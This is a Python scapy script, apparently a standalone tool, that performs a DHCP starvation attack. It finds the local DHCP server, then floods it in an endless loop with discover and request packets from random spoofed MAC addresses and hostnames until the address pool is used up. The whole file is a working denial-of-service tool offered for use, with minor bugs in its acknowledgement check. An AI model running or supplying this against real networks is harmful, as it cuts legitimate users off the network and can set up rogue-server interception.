#!/usr/bin/python
############################################################
#Imports
from scapy.all import *
from termcolor import colored
import datetime
import string
import argparse
import platform
import binascii

# Static Configuration
# Default Broadcast MAC Address
broadcast_mac = 'ff:ff:ff:ff:ff:ff'
# To stop scapy from checking return packet originating from any packet that we have sent out
conf.checkIPaddr=False
# Disable default scapy output
conf.verb = 0

# Arguments
parser = argparse.ArgumentParser()
parser.add_argument('-all', required=False, action='store_true', help='[Optional] Attack by all DHCP servers, by default it attacks only the first found.')
parser.add_argument('-i','--interface', action='store', required=True, dest='interface',help='[Required] Set interface to use on DHCP attacks.')
args = parser.parse_args()

localiface = args.interface

# Configuration
localmac = get_if_hwaddr(localiface)

# Header
print ('###[ DHCP Starvation ]###')
print ('###[ Version 0.5 ]###')
print ('###[ Date 08/04/2020 ]###')
print ('###[ by Bruno Botelho - bruno.botelho.br@gmail.com ]###')
print ('')

def random_bytes(num=6):
    return [random.randrange(256) for _ in range(num)]

def mac_to_hex(mac):
    if '3.' in platform.python_version():
        return binascii.unhexlify(mac.replace(':',''))
    else:
        return mac.replace(':', '').decode('hex')

def generate_mac(uaa=True, multicast=False, oui=None, separator=':', byte_fmt='%02x'):
    mac = random_bytes()
    if oui:
        if type(oui) == str:
            oui = [int(chunk) for chunk in oui.split(separator)]
        mac = oui + random_bytes(num=6-len(oui))
    else:
        if multicast:
            mac[0] |= 1 # set bit 0
        else:
            mac[0] &= ~1 # clear bit 0
        if uaa:
            mac[0] &= ~(1 << 1) # clear bit 1
        else:
            mac[0] |= 1 << 1 # set bit 1
    return str(separator.join(byte_fmt % b for b in mac))

def log_timestamp():
    return colored(datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S"))

def dhcp_server_ip():
    letters = string.ascii_lowercase
    hostname = str(''.join(random.choice(letters) for i in range(10)))
    ethernet = Ether(src=localmac,dst=broadcast_mac)
    ip = IP(src="0.0.0.0", dst='255.255.255.255')
    udp = UDP(sport=68,dport=67)
    bootp = BOOTP(chaddr=mac_to_hex(localmac),xid = RandInt())
    dhcp = DHCP(options=[('message-type', 'discover'),
    ('param_req_list',[1, 121, 3, 6, 15, 119, 252, 44, 46]),
    ('max_dhcp_size', 1500),
    ('client_id', localmac),
    ('lease_time', 43200),
    ('hostname', hostname),
    'end'])
    dhcp_discover_packet = ethernet / ip / udp / bootp / dhcp
    x = srp1(dhcp_discover_packet,iface=localiface, timeout=10)
    if (x == None):
        print ('###[ Request Timeout, DHCP Server not found ]###')
        quit()
    else:
        return x

def dhcp_dicovery(mac,hostname,t_id):
    if args.all:
        target_mac = broadcast_mac
    else:
        target_mac = dhcp_server_mac
    ethernet = Ether(src=localmac,dst=target_mac)
    ip = IP(src="0.0.0.0", dst='255.255.255.255')
    udp = UDP(sport=68,dport=67)
    bootp = BOOTP(flags=32768,chaddr=mac_to_hex(mac),xid = t_id)
    dhcp = DHCP(options=[('message-type', 'discover'),
    ('param_req_list',[1, 121, 3, 6, 15, 119, 252, 44, 46]),
    ('max_dhcp_size', 1500),
    ('client_id', mac),
    ('lease_time', 43200),
    ('hostname', hostname),
    'end'])
    dhcp_discover_packet = ethernet / ip / udp / bootp / dhcp
    #print(dhcp_discover_packet.display())
    x = srp1(dhcp_discover_packet,iface=localiface, timeout=10)
    return x

def dhcp_request(pkt,mac,tid,hostname):
    if args.all:
        target_mac = broadcast_mac
    else:
        target_mac = dhcp_server_mac
    ethernet = Ether(src=localmac,dst=target_mac)
    ip = IP(src="0.0.0.0", dst='255.255.255.255')
    udp = UDP(sport=68, dport=67)
    bootp = BOOTP(flags=32768, chaddr=mac_to_hex(mac), xid = tid)
    dhcp = DHCP(options=[('message-type','request'),
        ('server_id', pkt[IP].src),
        ('client_id', mac),
        ('hostname', hostname),
        ('vendor_class_id', 'MSFT 5.0'),
        ('client_FQDN', hostname),
        ('requested_addr', pkt[BOOTP].yiaddr),
        'end'])
    dhcp_request = ethernet / ip / udp / bootp / dhcp
    x = srp1(dhcp_request,iface=localiface, timeout=10)
    return x

# Discover DHCP Server Address
dhcp_server_pkt = dhcp_server_ip()
print ('###[ ' + log_timestamp() + ' Your MAC Address      : ' + colored(get_if_hwaddr(localiface),'blue') + ' ]###')
print ('###[ ' + log_timestamp() + ' DHCP Server IP Adress : ' + colored(dhcp_server_pkt.getlayer(BOOTP).siaddr,'blue')+ ' MAC: ' + colored(dhcp_server_pkt.getlayer(Ether).src,'blue') + ' ]###')
dhcp_server_mac = dhcp_server_pkt.getlayer(Ether).src
# Hapness Loop 
while True: 
    letters = string.ascii_lowercase
    hostname = str(''.join(random.choice(letters) for i in range(10)))
    mac = generate_mac()
    tid = random.randint(1, 4294967295)
    print ('###[ '+ log_timestamp() + ' Discovery Randon MAC  : ' + colored(str(mac),'red') + ' ]###')
    offer_pkt = dhcp_dicovery(mac,hostname,tid)
    if offer_pkt == None:
        print ('###[ '+ log_timestamp() + ' Discovery Timeout ]###')
    else:    
        print ('###[ '+ log_timestamp() + ' DHCP IP Offer         : ' + colored(offer_pkt[BOOTP].yiaddr,'red') + ' ]###')
        dhcp_request(offer_pkt,mac,tid,hostname)
        if dhcp_request != None:
            print ('###[ '+ log_timestamp() + ' Request Timeout ]###')
            print ('###[ '+ log_timestamp() + ' DHCP ACK              : ' + colored(offer_pkt[BOOTP].yiaddr,'red') + ' ]###')




